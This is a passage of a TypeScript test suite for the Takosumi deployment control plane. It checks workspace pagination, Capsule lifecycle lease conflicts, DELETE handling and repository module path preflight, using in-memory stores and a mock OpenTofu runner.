import { expect, test } from "bun:test";

import { ACCOUNT_SESSION_COOKIE_NAME } from "../../../../accounts/service/src/account-session.ts";
import { resolveRepoOwnedDeploymentProfile } from "../../../../accounts/service/src/control/repo-owned-install-config.ts";
import { oidcClientActivationDigest } from "../../../../accounts/service/src/oidc-activation.ts";
import { validateOidcLiveGrant } from "../../../../accounts/service/src/oidc-live-grant.ts";
import {
  handleControlRoute,
  type ControlPlaneOperations,
} from "../../../../accounts/service/src/control-routes.ts";
import { InMemoryAccountsStore } from "../../../../accounts/service/src/store.ts";
import { createTakosumiService } from "../../../../core/bootstrap.ts";
import type { RepositoryManifestDocument } from "takosumi-contract/repository-manifest";
import type {
  InstallConfig,
  SourceBuildConfig,
} from "takosumi-contract/install-configs";
import type {
  OpenTofuApplyJob,
  OpenTofuApplyResult,
  OpenTofuCapsuleSourceFilesJob,
  OpenTofuDestroyJob,
  OpenTofuPlanJob,
  OpenTofuPlanResult,
  OpenTofuRunner,
  OpenTofuStableSourceTagResolutionJob,
  OpenTofuSourceSnapshotPresentationFileJob,
} from "../../../../core/domains/deploy-control/mod.ts";
import { applyExpectedGuardFromPlanRun } from "../../../../core/domains/deploy-control/mod.ts";
import {
  InMemoryCapsuleCoordination,
  type CapsuleCoordination,
} from "../../../../core/domains/deploy-control/capsule_lease.ts";
import { InMemoryOpenTofuControlStore } from "../../../../core/domains/deploy-control/store.ts";
import { ObjectKeyArtifactReferenceAllocator } from "../../../../core/adapters/storage/artifact-references.ts";
import { DEFAULT_CAPSULE_INSTALL_CONFIG_ID } from "../../../../core/domains/capsules/default_install_config.ts";
import {
  fakeProviderVault,
  FIXTURE_ARCHIVE_DIGEST,
  FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE,
  FIXTURE_CLOUDFLARE_PROVIDER,
  seedCapsuleModel,
  seedProviderConnections,
} from "../../../helpers/deploy-control/model_fixture.ts";
import type {
  ApplyRun,
  PlanRun,
} from "@takosumi/internal/deploy-control-api";

const ORIGIN = "https://app.takosumi.test";
const PLAN_DIGEST =
  "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const LOCK_DIGEST =
  "sha256:abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
const STATE_DIGEST =
  "sha256:fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210";

const REPOSITORY_INTERFACE_MANIFEST = {
  apiVersion: "takosumi.com/v2.1",
  kind: "Repository",
  install: {
    defaultModule: ".",
    modules: {
      ".": {
        inputs: [],
        interfaces: [
          {
            key: "launcher",
            name: "app.launcher",
            spec: {
              type: "interface.ui.surface",
              version: "1",
              document: {
                display: { title: "Open app" },
                launcher: true,
              },
              inputs: {
                url: {
                  source: "output",
                  outputName: "launch_url",
                  outputType: "url",
                },
              },
              access: {
                visibility: "workspace",
                resourceUriInput: "url",
              },
            },
            bindingRequests: [
              {
                key: "installer",
                subject: { source: "installing_principal" },
                permissions: ["ui.open"],
                delivery: { type: "none" },
              },
            ],
          },
          {
            key: "unbound-status",
            name: "app.unbound-status",
            spec: {
              type: "example.status",
              version: "1",
              document: { purpose: "binding-negative-control" },
              inputs: {
                state: { source: "literal", value: "available" },
              },
              access: { visibility: "workspace" },
            },
          },
        ],
      },
    },
  },
} satisfies RepositoryManifestDocument;

interface RecordingRunner extends OpenTofuRunner {
  readonly planJobs: OpenTofuPlanJob[];
  readonly applyJobs: OpenTofuApplyJob[];
  readonly destroyJobs: OpenTofuDestroyJob[];
  readonly stableTagJobs: OpenTofuStableSourceTagResolutionJob[];
  readonly presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[];
  readonly capsuleSourceFileJobs: OpenTofuCapsuleSourceFilesJob[];
}

function recordingRunner(
  planResult: Partial<OpenTofuPlanResult> = {},
): RecordingRunner {
  const planJobs: OpenTofuPlanJob[] = [];
  const applyJobs: OpenTofuApplyJob[] = [];
  const destroyJobs: OpenTofuDestroyJob[] = [];
  const stableTagJobs: OpenTofuStableSourceTagResolutionJob[] = [];
  const presentationFileJobs: OpenTofuSourceSnapshotPresentationFileJob[] = [];
  const capsuleSourceFileJobs: OpenTofuCapsuleSourceFilesJob[] = [];
  return {
    planJobs,
    applyJobs,
    destroyJobs,
    stableTagJobs,
    presentationFileJobs,
    capsuleSourceFileJobs,
    plan: (job) => {
      planJobs.push(job);
      return Promise.resolve({
        planDigest: PLAN_DIGEST,
        planArtifact: {
          kind: "runner-local",
          ref: "runner-local://plan/tfplan",
          digest: PLAN_DIGEST,
          contentType: "application/vnd.opentofu.plan",
        },
        providerLockDigest: LOCK_DIGEST,
        requiredProviders: [FIXTURE_CLOUDFLARE_PROVIDER],
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
        planResourceChanges: [],
        ...planResult,
      });
    },
    apply: (job) => {
      applyJobs.push(job);
      return Promise.resolve({
        outputs: {
          launch_url: {
            sensitive: false,
            value: "https://hello.takosumi.test",
          },
          admin_token: { sensitive: true, value: "secret-output-token" },
        } as never,
        stateDigest: STATE_DIGEST,
        rawOutputRef: job.rawOutputRef,
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    destroy: (job) => {
      destroyJobs.push(job);
      return Promise.resolve({
        providerInstallation: [FIXTURE_CLOUDFLARE_MIRROR_EVIDENCE],
      });
    },
    readCapsuleSourceFiles: (job) => {
      capsuleSourceFileJobs.push(job);
      return Promise.resolve([
        {
          path: "main.tf",
          text: `
terraform {
  required_providers {
    cloudflare = {
      source = "cloudflare/cloudflare"
    }
  }
}

resource "cloudflare_workers_script" "app" {
  account_id  = "fixture-account"
  script_name = "fixture-app"
  content     = "export default { fetch() { return new Response('ok') } }"
}

output "launch_url" {
  value = "https://hello.takosumi.test"
}
`,
        },
      ]);
    },
    resolveStableSourceTag: (job) => {
      stableTagJobs.push(job);
      return Promise.resolve({
        tag: "v2.4.0",
        commit: "1234567890abcdef1234567890abcdef12345678",
      });
    },
    readSourceSnapshotPresentationFile: (job) => {
      presentationFileJobs.push(job);
      return Promise.resolve({
        path: job.path,
        text: '{"kind":"CapsuleSourceOptions"}\n',
        digest:
          "sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        sizeBytes: 32,
      });
    },
  };
}

function seedSession(
  store: InMemoryAccountsStore,
  subject = "user_test",
): string {
  const now = Date.now();
  store.saveAccount({
    subject,
    email: "user_test@example.test",
    displayName: "Route E2E User",
    createdAt: now,
    updatedAt: now,
  });
  const sessionId = `sess_real_operations_e2e_${subject}`;
  store.saveAccountSession({
    sessionId,
    subject,
    createdAt: now,
    expiresAt: now + 60_000,
  });
  return `${ACCOUNT_SESSION_COOKIE_NAME}=${sessionId}`;
}

function request(
  method: string,
  path: string,
  init: {
    readonly cookie?: string;
    readonly body?: unknown;
    readonly headers?: Readonly<Record<string, string>>;
  } = {},
): { readonly request: Request; readonly url: URL } {
  const url = new URL(`${ORIGIN}${path}`);
  const headers: Record<string, string> = { ...init.headers };
  if (init.cookie) headers.cookie = init.cookie;
  if (init.body !== undefined) headers["content-type"] = "application/json";
  return {
    request: new Request(url, {
      method,
      headers,
      ...(init.body !== undefined ? { body: JSON.stringify(init.body) } : {}),
    }),
    url,
  };
}

async function controlJson<T>(
  input: {
    readonly operations: ControlPlaneOperations;
    readonly store: InMemoryAccountsStore;
    readonly cookie: string;
    readonly method: string;
    readonly path: string;
    readonly body?: unknown;
    readonly headers?: Readonly<Record<string, string>>;
  },
  expectedStatus: number,
): Promise<T> {
  const built = request(input.method, input.path, {
    cookie: input.cookie,
    ...(input.body !== undefined ? { body: input.body } : {}),
    ...(input.headers ? { headers: input.headers } : {}),
  });
  const response = await handleControlRoute({
    request: built.request,
    url: built.url,
    store: input.store,
    operations: input.operations,
  });
  expect(response).toBeDefined();
  if (response!.status !== expectedStatus) {
    const failureText = await response!.clone().text();
    throw new Error(
      `${input.method} ${input.path} expected ${expectedStatus}, got ${response!.status}: ${failureText}`,
    );
  }
  expect(response!.headers.get("server-timing")).toContain("tk_control_auth");
  expect(response!.headers.get("server-timing")).toContain(
    "tk_control_dispatch",
  );
  return (await response!.json()) as T;
}

test("account Workspace inventory follows real active membership pagination", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });

  const first = await operations.workspaces.createWorkspace({
    handle: "inventory-first",
    displayName: "Inventory first",
    type: "personal",
    ownerUserId: "user_test",
  });
  const archived = await operations.workspaces.createWorkspace({
    handle: "inventory-archived",
    displayName: "Inventory archived",
    type: "organization",
    ownerUserId: "user_test",
  });
  await operations.workspaces.updateWorkspace(archived.id, { archived: true });

  const firstPage = await controlJson<{
    readonly kind: string;
    readonly workspaces: readonly { readonly id: string }[];
    readonly total: number;
    readonly returned: number;
    readonly limit: number;
    readonly truncated: boolean;
    readonly nextCursor?: string;
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: "/api/v1/views/workspaces.v1?limit=1",
    },
    200,
  );
  expect(firstPage.kind).toBe("takosumi.account-workspace-inventory@v1");
  expect(firstPage.total).toBe(2);
  expect(firstPage.returned).toBe(1);
  expect(firstPage.limit).toBe(1);
  expect(firstPage.truncated).toBe(true);
  expect(firstPage.nextCursor).toBeString();

  const secondPage = await controlJson<typeof firstPage>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "GET",
      path: `/api/v1/views/workspaces.v1?limit=1&cursor=${encodeURIComponent(firstPage.nextCursor!)}`,
    },
    200,
  );
  expect(secondPage.kind).toBe(firstPage.kind);
  expect(secondPage.total).toBe(2);
  expect(secondPage.returned).toBe(1);
  expect(secondPage.limit).toBe(1);
  expect(secondPage.truncated).toBe(false);
  expect(secondPage.nextCursor).toBeUndefined();
  expect(new Set([
    firstPage.workspaces[0]?.id,
    secondPage.workspaces[0]?.id,
  ])).toEqual(new Set([first.id, archived.id]));
  expect(
    firstPage.workspaces.some((workspace) => workspace.id === archived.id) ||
      secondPage.workspaces.some((workspace) => workspace.id === archived.id),
  ).toBe(true);
});

function storeEligibleInstallConfig(url: string) {
  return {
    sourceSelector: { url, path: "legacy/policy-path" },
    store: {
      source: { url, path: "legacy/store-path" },
      order: 1,
      surface: "service",
      kind: "application",
      provider: "portable",
      suggestedName: "test-app",
      badge: { ja: "App", en: "App" },
      name: { ja: "Test app", en: "Test app" },
      description: { ja: "Fixture", en: "Fixture" },
    },
  };
}

async function seedQueuedNoStateCapsuleApply(
  store: InMemoryOpenTofuControlStore,
  input: {
    readonly workspaceId: string;
    readonly capsuleId: string;
    readonly planRunId: string;
    readonly applyRunId: string;
    readonly environment?: string;
  },
) {
  const seeded = await seedCapsuleModel(store, {
    workspaceId: input.workspaceId,
    capsuleId: input.capsuleId,
    sourceId: `src_${input.capsuleId}`,
    snapshotId: `snap_${input.capsuleId}`,
    installConfigId: `cfg_${input.capsuleId}`,
    environment: input.environment ?? "production",
  });
  const capsule = {
    ...seeded.capsule,
    installingPrincipalId: "user_test",
  };
  await store.putCapsule(capsule);
  const planRun: PlanRun = {
    id: input.planRunId,
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    capsuleContext: {
      workspaceId: capsule.workspaceId,
      capsuleId: capsule.id,
      environment: capsule.environment,
    },
    capsuleCurrentStateVersionId: null,
    source: {
      kind: "git",
      url: seeded.source.url,
      commit: seeded.snapshot.resolvedCommit,
    },
    sourceSnapshotId: seeded.snapshot.id,
    sourceDigest: "sha256:source",
    operation: "create",
    runnerProfileId: "opentofu-default",
    variablesDigest: "sha256:variables",
    requiredProviders: [],
    status: "succeeded",
    policy: { status: "passed", reasons: [], checkedAt: 1 },
    policyDecisionDigest: "sha256:policy",
    planDigest: PLAN_DIGEST,
    planArtifact: {
      kind: "runner-local",
      ref: `runner-local://plan/${input.planRunId}`,
      digest: PLAN_DIGEST,
    },
    baseStateGeneration: 0,
    auditEvents: [],
    createdAt: 1,
    updatedAt: 1,
  };
  await store.putPlanRun(planRun);
  await store.putPlanRunInputs({
    planRunId: planRun.id,
    variables: {},
    generatedRoot: {
      files: { "main.tf": 'module "child" { source = "./module" }' },
      moduleFiles: [{ path: "main.tf", text: "# fixture module" }],
    },
  });
  const applyRun: ApplyRun = {
    id: input.applyRunId,
    planRunId: planRun.id,
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    operation: "create",
    runnerProfileId: "opentofu-default",
    status: "queued",
    expected: applyExpectedGuardFromPlanRun(planRun),
    stateBackend: { kind: "managed", ref: "state" } as never,
    stateLock: { status: "pending", backendRef: "state" },
    auditEvents: [],
    createdAt: 1,
    updatedAt: 1,
  };
  await store.putApplyRun(applyRun);
  return { capsule, planRun, applyRun };
}

function applyRunner(input: {
  readonly jobs: OpenTofuApplyJob[];
  readonly apply?: (job: OpenTofuApplyJob) => Promise<OpenTofuApplyResult>;
}): OpenTofuRunner {
  return {
    plan: () => Promise.reject(new Error("not used")),
    apply: async (job) => {
      input.jobs.push(job);
      if (input.apply) return await input.apply(job);
      return {
        outputs: {},
        stateDigest: STATE_DIGEST,
        rawOutputRef: job.rawOutputRef,
      };
    },
  };
}

test("default service coordination returns 409 while provider Apply holds the Capsule lease", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  let applyEntered!: () => void;
  const entered = new Promise<void>((resolve) => {
    applyEntered = resolve;
  });
  let releaseApply!: () => void;
  const held = new Promise<void>((resolve) => {
    releaseApply = resolve;
  });
  const applyJobs: OpenTofuApplyJob[] = [];
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: applyRunner({
      jobs: applyJobs,
      apply: async (job) => {
        applyEntered();
        await held;
        return {
          outputs: {},
          stateDigest: STATE_DIGEST,
          rawOutputRef: job.rawOutputRef,
        };
      },
    }),
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_apply_first",
    capsuleId: "cap_abandon_apply_first",
    planRunId: "plan_abandon_apply_first",
    applyRunId: "apply_abandon_apply_first",
  });
  const applying = operations.dispatchQueuedRun({
    action: "apply",
    runId: seeded.applyRun.id,
    workspaceId: seeded.capsule.workspaceId,
  });
  await entered;

  let response: Response | undefined;
  try {
    const built = request(
      "DELETE",
      `/api/v1/capsules/${seeded.capsule.id}`,
      { cookie },
    );
    response = await handleControlRoute({
      request: built.request,
      url: built.url,
      store: accountStore,
      operations,
    });
    expect(response?.status).toBe(409);
    expect(await response?.json()).toMatchObject({
      error: {
        code: "failed_precondition",
        details: { reason: "capsule_lifecycle_busy" },
      },
    });
    expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
      "pending",
    );
  } finally {
    releaseApply();
    await applying;
  }

  expect(applyJobs).toHaveLength(1);
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "active",
  );
});

test("abandon wins the Capsule lifecycle lease before a queued Apply rechecks destroyed status", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const innerCoordination = new InMemoryCapsuleCoordination();
  const acquiredScopes: string[] = [];
  const coordination: CapsuleCoordination = {
    acquireLease: async (input) => {
      acquiredScopes.push(input.scope);
      return await innerCoordination.acquireLease(input);
    },
    renewLease: (input) => innerCoordination.renewLease(input),
    releaseLease: (input) => innerCoordination.releaseLease(input),
  };
  const applyJobs: OpenTofuApplyJob[] = [];
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: applyRunner({ jobs: applyJobs }),
    capsuleCoordination: coordination,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
  });
  const seeded = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_first",
    capsuleId: "cap_abandon_first",
    planRunId: "plan_abandon_first",
    applyRunId: "apply_abandon_first",
    environment: "preview",
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${seeded.capsule.id}`,
    },
    202,
  );
  expect(acquiredScopes).toEqual([
    `capsule:${seeded.capsule.id}:${seeded.capsule.environment}`,
  ]);
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "destroyed",
  );

  await operations.dispatchQueuedRun({
    action: "apply",
    runId: seeded.applyRun.id,
    workspaceId: seeded.capsule.workspaceId,
  });

  expect(applyJobs).toHaveLength(0);
  expect((await deployStore.getApplyRun(seeded.applyRun.id))?.status).toBe(
    "failed",
  );
  expect((await deployStore.getCapsule(seeded.capsule.id))?.status).toBe(
    "destroyed",
  );
});

test("no-state Capsule DELETE rejects any runtime effect but permits pre-dispatch failure", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
  });
  const unknown = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_unknown",
    capsuleId: "cap_abandon_unknown",
    planRunId: "plan_abandon_unknown",
    applyRunId: "apply_abandon_unknown",
  });
  await deployStore.putApplyRun({
    ...unknown.applyRun,
    status: "failed",
    startedAt: 2,
    finishedAt: 3,
    updatedAt: 3,
    auditEvents: [
      {
        id: "audit_abandon_unknown",
        type: "apply.failed",
        at: 3,
        data: { providerDispatched: true },
      },
    ],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${unknown.capsule.id}`,
    },
    409,
  );
  expect((await deployStore.getCapsule(unknown.capsule.id))?.status).toBe(
    "pending",
  );

  const preDispatch = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_predispatch",
    capsuleId: "cap_abandon_predispatch",
    planRunId: "plan_abandon_predispatch",
    applyRunId: "apply_abandon_predispatch",
  });
  await deployStore.putApplyRun({
    ...preDispatch.applyRun,
    status: "failed",
    startedAt: 4,
    finishedAt: 5,
    updatedAt: 5,
    auditEvents: [],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${preDispatch.capsule.id}`,
    },
    202,
  );
  expect((await deployStore.getCapsule(preDispatch.capsule.id))?.status).toBe(
    "destroyed",
  );

  const safe = await seedQueuedNoStateCapsuleApply(deployStore, {
    workspaceId: "ws_abandon_safe",
    capsuleId: "cap_abandon_safe",
    planRunId: "plan_abandon_safe",
    applyRunId: "apply_abandon_safe",
  });
  await deployStore.putApplyRun({
    ...safe.applyRun,
    status: "succeeded",
    startedAt: 6,
    finishedAt: 7,
    updatedAt: 7,
    auditEvents: [],
  });

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "DELETE",
      path: `/api/v1/capsules/${safe.capsule.id}`,
    },
    409,
  );
  expect((await deployStore.getCapsule(safe.capsule.id))?.status).toBe(
    "pending",
  );
});

test("repository preflight resolves the default before exact compatibility while manual Git keeps explicit modulePath", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const repositoryUrl =
    "https://git.example.com/example/repository-default.git";
  const hostPolicy = {
    id: "cfg_repo_default_host_policy",
    name: "repo-default-host-policy",
    sourceSelector: {
      url: "https://git.example.com/example/repository-default/",
      path: ".",
    },
    store: {
      source: { url: repositoryUrl, path: "." },
      order: 1,
      surface: "service",
      kind: "application",
      provider: "portable",
      suggestedName: "repo-default",
      badge: { ja: "追加", en: "Install" },
      name: { ja: "既定", en: "Default" },
      description: { ja: "既定", en: "Default" },
    },
    sourceBuild: {
      commands: [{ argv: ["bun", "install", "--frozen-lockfile"] }],
      outputs: ["node_modules/.ready"],
    },
    lifecycleActions: [
      {
        apiVersion: "takosumi.dev/v1alpha1" as const,
        kind: "command" as const,
        id: "repo-default-activate",
        phase: "post_apply" as const,
        executor: "runner" as const,
        command: ["bun", "run", "activate"],
        runnerCapability: "capsule.lifecycle.command.v1",
      },
    ],
    variableMapping: {},
    outputAllowlist: {},
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner" as const],
        allowedRunnerCapabilities: ["capsule.lifecycle.command.v1"],
      },
    },
    createdAt: "2026-06-06T00:00:00.000Z",
    updatedAt: "2026-06-06T00:00:00.000Z",
  };
  const { operations } = await createTakosumiService({
    role: "takosumi-api",
    runtimeEnv: { TAKOSUMI_DEV_MODE: "1" },
    opentofuControlStore: deployStore,
    opentofuRunner: runner,
    artifactReferenceAllocator: new ObjectKeyArtifactReferenceAllocator(),
    operatorInstallConfigs: [hostPolicy],
  });
  const seeded = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_repo_default_preflight",
    capsuleId: "cap_repo_default_seed",
    installConfigId: "icfg_repo_default_base",
    sourceUrl: repositoryUrl,
    installConfig: {
      modulePath: ".",
    },
  });
  const digest = `sha256:${"c".repeat(64)}`;
  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2.1",
        kind: "Repository",
        install: {
          defaultModule: "deploy/takoform",
          modules: {
            ".": { inputs: [] },
            "deploy/takoform": { inputs: [] },
          },
        },
      },
    },
  });

  const preview = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    201,
  );

  expect(runner.capsuleSourceFileJobs).toHaveLength(1);
  expect(runner.capsuleSourceFileJobs[0]?.modulePath).toBe("deploy/takoform");
  const derivedInstallConfig = await operations.capsules.getInstallConfig(
    preview.repositoryInstallUx.installConfigId,
  );
  expect(derivedInstallConfig.modulePath).toBe("deploy/takoform");
  expect(derivedInstallConfig.sourceSelector).toEqual({
    url: seeded.source.url,
    path: seeded.source.defaultPath,
  });
  expect(derivedInstallConfig.store).toBeUndefined();
  expect(derivedInstallConfig.sourceBuild).toEqual(hostPolicy.sourceBuild);
  expect(derivedInstallConfig.lifecycleActions).toEqual(
    hostPolicy.lifecycleActions,
  );

  const createdFromDerivedConfig = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-derived-create",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: derivedInstallConfig.id,
      },
    },
    201,
  );
  const createdFromDerivedInstallConfig =
    await operations.capsules.getInstallConfig(
      createdFromDerivedConfig.capsule.installConfigId,
    );
  expect(createdFromDerivedInstallConfig.modulePath).toBe(
    "deploy/takoform",
  );

  const whitespaceDerivedConfig = await operations.capsules.putInstallConfig({
    ...derivedInstallConfig,
    id: "icfg_repo_default_whitespace",
    name: "repo-default-whitespace",
    modulePath: " deploy/takoform ",
  });
  const whitespaceModuleOverride = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-whitespace-override",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: whitespaceDerivedConfig.id,
        modulePath: "deploy/takoform",
      },
    },
    400,
  );
  expect(whitespaceModuleOverride.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_mismatch",
    },
  });

  const emptyDerivedConfig = await operations.capsules.putInstallConfig({
    ...derivedInstallConfig,
    id: "icfg_repo_default_empty",
    name: "repo-default-empty",
    modulePath: "",
  });
  const emptyDerivedModule = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${seeded.workspace.id}/capsules`,
      body: {
        name: "repo-default-empty-module",
        environment: "production",
        sourceId: seeded.source.id,
        installConfigId: emptyDerivedConfig.id,
      },
    },
    400,
  );
  expect(emptyDerivedModule.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_module_path_missing",
    },
  });

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2",
        kind: "Repository",
        install: {
          modules: {
            "deploy/first": { inputs: [] },
            "deploy/second": { inputs: [] },
          },
        },
      },
    },
  });
  const missingDefault = await controlJson<{
    readonly error: {
      readonly code: string;
      readonly details?: { readonly diagnosticCode?: string };
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    400,
  );
  expect(missingDefault.error).toMatchObject({
    code: "repository_install_ux_invalid",
    details: {
      diagnosticCode: "repository_install_ux_default_module_missing",
    },
  });
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);

  await deployStore.putSourceSnapshot({
    ...seeded.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v2.1",
        kind: "Repository",
        install: {
          defaultModule: "deploy/takoform",
          modules: {
            ".": { inputs: [] },
            "deploy/takoform": { inputs: [] },
          },
        },
      },
    },
  });
  await deployStore.putInstallConfig({
    ...seeded.installConfig,
    id: "icfg_repo_default_ambiguous",
    name: "repo-default-ambiguous",
  });
  const historicalSharedRowsIgnored = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        capsuleName: "repo-default",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(historicalSharedRowsIgnored.repositoryInstallUx.status).toBe(
    "accepted",
  );
  expect(runner.capsuleSourceFileJobs).toHaveLength(1);

  const missing = await seedCapsuleModel(deployStore, {
    workspaceId: seeded.workspace.id,
    sourceId: "src_repo_default_missing",
    snapshotId: "snap_repo_default_missing",
    capsuleId: "cap_repo_default_missing",
    installConfigId: "icfg_repo_default_unlisted",
    name: "repo-default-missing",
    sourceUrl: "https://git.example.com/example/unlisted.git",
  });
  await deployStore.putSourceSnapshot({
    ...missing.snapshot,
    repositoryManifest: {
      status: "present",
      digest,
      document: {
        apiVersion: "takosumi.com/v1",
        kind: "Repository",
        install: { modules: { "deploy/only": { inputs: [] } } },
      },
    },
  });
  const genericBase = await controlJson<{
    readonly repositoryInstallUx: {
      readonly status: "accepted";
      readonly installConfigId: string;
    };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${missing.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: missing.snapshot.id,
        capsuleName: "repo-default-missing",
        compileInstallUx: true,
      },
    },
    201,
  );
  expect(genericBase.repositoryInstallUx.status).toBe("accepted");
  expect(runner.capsuleSourceFileJobs).toHaveLength(2);

  await controlJson(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/sources/${seeded.source.id}/compatibility-check`,
      body: {
        sourceSnapshotId: seeded.snapshot.id,
        modulePath: "deploy/manual",
        installConfigId: seeded.installConfig.id,
      },
    },
    201,
  );
  expect(runner.capsuleSourceFileJobs[2]?.modulePath).toBe("deploy/manual");

  const manual = await seedCapsuleModel(deployStore, {
    workspaceId: "ws_manual_module_create",
    sourceId: "src_manual_module_create",
    capsuleId: "cap_manual_module_seed",
    installConfigId: "icfg_manual_module_base",
    sourceUrl: "https://git.example.com/example/manual-module.git",
    installConfig: { modulePath: "." },
  });
  const manualCreated = await controlJson<{
    readonly capsule: { readonly id: string; readonly installConfigId: string };
  }>(
    {
      operations,
      store: accountStore,
      cookie,
      method: "POST",
      path: `/api/v1/workspaces/${manual.workspace.id}/capsules`,
      body: {
        name: "manual-module-selection",
        environment: "production",
        sourceId: manual.source.id,
        installConfigId: manual.installConfig.id,
        modulePath: "deploy/manual",
      },
    },
    201,
  );
  const manualConfig = await operations.capsules.getInstallConfig(
    manualCreated.capsule.installConfigId,
  );
  expect(manualConfig.modulePath).toBe("deploy/manual");
});

test("Store deployment profiles are listed, selected by opaque key, and module-proven before compatibility", async () => {
  const accountStore = new InMemoryAccountsStore();
  const cookie = seedSession(accountStore);
  const deployStore = new InMemoryOpenTofuControlStore();
  const runner = recordingRunner();
  const repositoryUrl = "https://git.example.com/example/profiled-app.git";
  const profile = (input: {
    readonly id: string;
    readonly key: string;
    readonly modulePath: string;
    readonly recommended: boolean;
    readonly order: number;
  }): InstallConfig => ({
    id: input.id,
    name: input.key,
    sourceSelector: { url: repositoryUrl, path: "." },
    modulePath: input.modulePath,
